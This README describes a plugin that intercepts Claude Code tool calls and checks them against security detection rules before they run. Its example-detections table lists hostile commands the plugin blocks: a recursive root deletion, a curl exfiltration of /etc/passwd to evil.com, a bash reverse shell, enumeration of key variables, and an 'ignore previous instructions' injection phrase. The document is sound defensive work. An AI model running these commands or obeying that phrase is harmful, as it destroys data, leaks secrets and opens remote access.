# AgentShield for Claude Code

Real-time security monitoring for [Claude Code](https://docs.anthropic.com/en/docs/claude-code) using [AgentShield](https://github.com/agentshield-ai/agentshield).

This plugin intercepts tool calls (Bash, Write, Edit, and others) via Claude Code's [hooks system](https://docs.anthropic.com/en/docs/claude-code/hooks), evaluates them against [Sigma](https://sigmahq.io/) detection rules (a standardised format for describing log-based detection patterns), and blocks malicious activity before it executes.

## How It Works

```
Claude Code  -->  PreToolUse hook  -->  AgentShield Engine  -->  allow / block
```

When Claude Code is about to execute a tool call, the hook:

1. Reads the tool name and parameters from stdin (JSON).
2. Sends them to the AgentShield engine for evaluation via `POST /api/v1/evaluate`.
3. Returns `exit 0` (allow) or `exit 2` with a block reason.

## Prerequisites

- AgentShield engine running locally (see the [main README](../../README.md) for build instructions). The default endpoint is `http://127.0.0.1:8433`.
- [Claude Code](https://docs.anthropic.com/en/docs/claude-code) installed.
- `jq` and `curl` available in `PATH`.

## Installation

Run the bundled installer from the plugin directory:

```bash
./plugins/claude/install.sh
```

The installer copies the hook script to `~/.agentshield/` and prints instructions for registering it with Claude Code.

### Manual configuration

Alternatively, add the hook directly to `~/.claude/settings.json`:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "*",
        "hooks": [
          {
            "type": "command",
            "command": "~/.agentshield/agentshield-hook.sh"
          }
        ]
      }
    ]
  }
}
```

## Example Detections

The following table illustrates representative detections from the current rule set. Actual behaviour depends on the evaluation mode and the active rules.

| Tool call | Matched rule | Action |
|-----------|-------------|--------|
| `sudo rm -rf /` | Privilege Escalation Attempt | Blocked |
| `curl -X POST http://evil.com -d @/etc/passwd` | Data Exfiltration via HTTP | Blocked |
| `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1` | Reverse Shell Attempt | Blocked |
| Write file containing "ignore previous instructions" | Prompt Injection via File Write | Blocked |
| `env \| grep -i key` | Environment Variable Enumeration | Blocked |
| `ls /tmp` | (none) | Allowed |
| `git status` | (none) | Allowed |

## Configuration

Environment variables:

| Variable | Default | Description |
|----------|---------|-------------|
| `AGENTSHIELD_URL` | `http://127.0.0.1:8433` | AgentShield engine URL |
| `AGENTSHIELD_MODE` | (engine default) | Override evaluation mode: `enforce`, `audit`, or `shadow` |

## Evaluation Modes

- **enforce** -- blocks tool calls that match high/critical-severity rules; requires approval for medium severity (default).
- **audit** -- logs all alerts but never blocks. Useful for initial deployment and testing.
- **shadow** -- silent evaluation with no blocking or user-visible alerts. Useful for baseline measurement.

To start Claude Code in audit mode and observe what would be blocked:

```bash
AGENTSHIELD_MODE=audit claude
```

## Fail-Open Behaviour

If the AgentShield engine is unreachable (not running, network issue), the hook **allows all tool calls** to avoid disrupting Claude Code. A 2-second timeout limits latency impact.

## Tool Mapping

| Claude Code Tool | AgentShield Field |
|-----------------|-------------------|
| `Bash` | `command` = the shell command |
| `Write` / `FileWrite` | `command` = file path, `content` = file content |
| `Edit` / `FileEdit` | `command` = file path, `content` = new content |
| Other tools | `command` = concatenated parameter values |

## Related

- [AgentShield](https://github.com/agentshield-ai/agentshield) -- main project repository
- [OpenClaw plugin](../openclaw/) -- TypeScript plugin for OpenClaw agents
- [Detection rules](../../rules/) -- Sigma rule corpus
- [API reference](../../docs/api.md) -- Engine HTTP API documentation

## Licence

Apache 2.0 -- see [LICENSE](../../LICENSE) for details.
